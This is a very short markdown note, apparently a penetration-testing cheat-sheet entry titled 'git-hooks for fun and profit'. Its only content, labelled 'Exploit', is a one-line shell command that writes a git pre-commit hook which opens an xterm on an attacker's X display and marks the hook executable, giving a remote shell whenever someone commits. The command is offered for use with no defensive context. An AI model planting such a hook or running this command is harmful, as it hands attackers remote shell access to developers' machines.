git-hooks for fun and profit
======================

**Exploit**
```shell-session

echo "xterm -display <attacker IP>:1 &" > .git/hooks/pre-commit; chmod +x .git/hooks/pre-commit

```

